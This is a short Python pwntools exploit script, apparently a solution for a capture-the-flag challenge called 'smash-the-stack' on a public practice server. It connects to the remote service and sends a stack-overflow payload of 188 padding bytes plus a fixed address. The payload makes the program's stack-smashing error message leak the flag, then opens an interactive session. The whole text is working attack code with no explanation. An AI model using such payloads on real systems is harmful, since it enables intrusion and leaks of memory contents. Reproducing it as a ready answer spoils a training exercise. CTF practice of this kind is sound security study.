from pwn import *
#context.log_level = 'debug'
#p = process('smash-the-stack',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7717)
#gdb.attach(p)
p.recvuntil('flag\n')
payload = 'a'*188 + p32(0x0804A060)
p.sendline(payload)
p.recvuntil('detected ***: ')
flag = p.recvuntil('}')
print flag


p.interactive()